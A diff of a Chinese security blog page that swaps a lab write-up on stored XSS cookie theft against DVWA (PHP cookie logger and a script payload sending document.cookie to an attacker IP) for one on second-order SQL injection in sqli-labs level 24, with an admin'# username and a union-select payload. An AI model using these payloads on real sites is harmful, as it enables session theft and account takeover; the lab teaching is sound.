@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">XSS攻击实战 | 奇点的小屋！</title>
+  <title itemprop="name">SQL注入-二次注入 | 奇点的小屋！</title>
   
     <link rel="shortcut icon" href="/images/favicon.png">
   
@@ -298,11 +298,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alz0G4.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alz0G4.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://s1.ax1x.com/2020/07/31/alzBRJ.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzBRJ.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      XSS攻击实战</h1>
+      SQL注入-二次注入</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -314,7 +314,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-9-20<span class="bull">
+        2020-9-21<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -328,21 +328,51 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>实验环境：<code>kail虚拟机与本机</code><br>先来kail里操作一波</p>
-<p>①开启kail的apache服务，开启命令<code>/etc/init.d/apache2 start</code><br><img src="https://img-blog.csdnimg.cn/20200920161040299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>第一步成功了！</p>
-<p>②进入/var/www/html/里创建新文件cookie.php,命令：<code>sudo touch cookie.php</code><br>③再用vi进行编辑，命令<code>sudo vi cookie.php</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie &#x3D; $_GET[&#39;cookie&#39;];</span><br><span class="line">$ip &#x3D; getenv (&#39;REMOTE_ADDR&#39;);</span><br><span class="line">$time &#x3D; date(&#39;Y-m-d g:i:s&#39;);</span><br><span class="line">$fp &#x3D; fopen(&quot;cookie.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>保存的命令<code>:wq</code>找了好久才找到的，保存好之后需要给我们的脚本提权。<br>④<br>我们需要手动创建一个cookie.txt文件并且对他进行修改<br>命令：<code>sudo touch cookie.txt</code>和<code>sudo chmod 777 cookie.txt</code><br><img src="https://img-blog.csdnimg.cn/202009201624520.png#pic_center" alt="在这里插入图片描述"></p>
-<p>⑤使用<code>ps aux | grep apache</code>枚举出apache服务的所属组<br><img src="https://img-blog.csdnimg.cn/20200920162626263.png#pic_center" alt="在这里插入图片描述"><br>⑥使用<code>chown www-data:www-data cookie.txt</code>更改一下，确保cookie.txt所有组已经成为了www-data</p>
-<p><img src="https://img-blog.csdnimg.cn/2020092016321035.png#pic_center" alt="在这里插入图片描述"><br>这步也已经🆗了</p>
-<p>⑦再使用<code>curl 192.168.132.144/cookie.php?cookie=1</code>试一下是否能正确写入数据<br><img src="https://img-blog.csdnimg.cn/20200920163425596.png#pic_center" alt="在这里插入图片描述"><br>Good!!!</p>
-<p>在本机的DVWA中找到XSS存储型漏洞(等级为low)</p>
-<p>我们构造payload：<code>&lt;script&gt;document.write(&#39;&lt;img src=&quot;http://192.168.46.129/cookie.php?cookie=&#39;+document.cookie+&#39;&quot; width=0 height=0 &gt;&#39;)&lt;/script&gt;</code>并提交。</p>
-<p>注意将IP改为kail攻击机的IP</p>
-<p>由于对提交的评论有字符限制，我们可以修改最大字数限制<br><img src="https://img-blog.csdnimg.cn/20200920172616589.png#pic_center" alt="在这里插入图片描述"></p>
-<p>随便输入评论，我们这边查看cookie.txt</p>
-<p><img src="https://img-blog.csdnimg.cn/20200920172743570.png#pic_center" alt="在这里插入图片描述"></p>
-<p>已经存进来了，至于拿到了cookie怎么用，我已经在前面讲过了</p>
+          <p>原理：用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点摸样也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。</p>
+<p>图解：<br><img src="https://img-blog.csdnimg.cn/20200920205949591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>二次注入比普通的注入更难发现，很难被工具扫描出来。</p>
+<p>原理大概知道了，接下来就是实战了</p>
+<p>以sql-libs第24关为例</p>
+<p><img src="https://img-blog.csdnimg.cn/20200921110839481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>有登录，注册页面</p>
+<p>好奇的我就试了一下弱口令登录</p>
+<p><img src="https://img-blog.csdnimg.cn/20200921111302215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>啧啧啧，登陆成功了！不过这和本文没有联系，回到正题！</p>
+<p>我们利用注册功能，将我们的数据插入数据库里。<br><img src="https://img-blog.csdnimg.cn/20200921185240418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>登陆试试<br><img src="https://img-blog.csdnimg.cn/20200921185510224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>登录进去，现在我们修改密码<br><img src="https://img-blog.csdnimg.cn/20200921190126471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们查看一下<br><img src="https://img-blog.csdnimg.cn/20200921190211502.png#pic_center" alt="在这里插入图片描述"><br>我们登录的是admin’#，但是修改的却是admin账号的密码，那为什么admin账号的密码会被改变呢？？？</p>
+<p>我们去靶场源文件pass_chang.php看一下<br>找到这句话</p>
+<blockquote>
+<p>$ sql = “UPDATE users SET PASSWORD=’$ pass’ where username=’$ username’ and password=’$ curr_pass’ “;</p>
+</blockquote>
+<p>我们的用户名被<code>admin&#39;#</code>传入进去，在数据库里#号为注释符<br>然后这句话就变成了</p>
+<blockquote>
+<p>$ sql = “UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘#’ and password=’$ curr_pass’ “;</p>
+</blockquote>
+<p>然后就是</p>
+<blockquote>
+<p>$ sql = “UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘</p>
+</blockquote>
+<p>从而将用户名为admin的账号的密码修改了</p>
+<p><strong>数据库还是对自己太过相信，认为数据库里的数据都是正常的，当从数据库里调用的时候没有经过过滤，这就造成了二次注入。</strong></p>
+<p>在源码里找到了<code>mysql_real_escape_string($_POST[&quot;login_user&quot;])；</code>这个函数将我们的输入的数据进行转义</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">下列字符受影响：</span><br><span class="line"></span><br><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&#39;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br><span class="line">如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</span><br></pre></td></tr></table></figure>
+<p>emmmm</p>
+<p>再次演示一下攻击</p>
+<p>先创建一个list.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;..&#x2F;sql-connections&#x2F;sql-connect.php&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users ORDER BY id&quot;;</span><br><span class="line">$result&#x3D;mysql_query($sql);</span><br><span class="line">$num&#x3D;mysql_num_rows($result);</span><br><span class="line">for ($i&#x3D;0; $i &lt; $num; ++$i) &#123; </span><br><span class="line">    $row &#x3D; mysql_fetch_array($result);</span><br><span class="line">    $username &#x3D; $row[1];</span><br><span class="line">    $sql_detail &#x3D; &quot;SELECT * FROM users where username&#x3D;&#39;$username&#39;&quot;;</span><br><span class="line">    $result_detail&#x3D;mysql_query($sql_detail);</span><br><span class="line">    $num_detail &#x3D; mysql_num_rows($result_detail);</span><br><span class="line">    for ($j&#x3D;0; $j &lt; $num_detail; ++$j) &#123; </span><br><span class="line">        $row_detail &#x3D; mysql_fetch_array($result_detail);</span><br><span class="line">        echo&lt;&lt;&lt;END</span><br><span class="line">        &lt;table border&#x3D;&quot;1&quot; style&#x3D;&quot;table-layout:fixed;&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;th&gt;$row_detail[1]&lt;&#x2F;th&gt;</span><br><span class="line">                &lt;th&gt;$row_detail[2]&lt;&#x2F;th&gt;</span><br><span class="line">            &lt;&#x2F;tr&gt;</span><br><span class="line">        &lt;&#x2F;table&gt;</span><br><span class="line">END;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我选择把list.php和sql-connect.php放在一起</p>
+<p>现在我们在注册一个用户名<code>1’ union select  1,user(),database()#</code></p>
+<p>然后访问list.php<br><img src="https://img-blog.csdnimg.cn/20200921195039494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用户名和密码就被打印出来了</p>
+<p>我们分析一下流程。</p>
+<p>list.php包含了sql-connect.php，我们创建好账号后，再次登录使用<code>1‘ union select 1,user(),database() #</code></p>
+<blockquote>
+<p>  $ username = $row[1];<br>    $ sql_detail = “SELECT * FROM users where username=’$ username’”;</p>
+</blockquote>
+<p>我们的username传入进去</p>
+<blockquote>
+<p>$ sql_detail = “SELECT * FROM users where username=’1’ union select<br>1,user(),database() #’”;</p>
+</blockquote>
+<p>也就是语句变成了</p>
+<blockquote>
+<p>$ sql_detail = “SELECT * FROM users where username=union select 1,user(),database() ”;</p>
+</blockquote>
+<p>我们从表里就打印出了账号和密码这张表。</p>
 
         </div>
         <!-- .entry-content -->
@@ -371,36 +401,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/09/21/SQL%E6%B3%A8%E5%85%A5%E2%80%94%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzBRJ.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzBRJ.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                SQL注入-二次注入</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/09/19/%E6%AF%8F%E5%91%A8%E5%88%B7%E9%A2%98(%E4%B8%80)/" rel="next">
+            <a href="/2020/09/20/XSS%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alzBRJ.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alzBRJ.jpg">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://s1.ax1x.com/2020/07/31/alz0G4.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://s1.ax1x.com/2020/07/31/alz0G4.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                每周刷题(一)</h3>
+                XSS攻击实战</h3>
                 <hr>
               </div>
             </a>
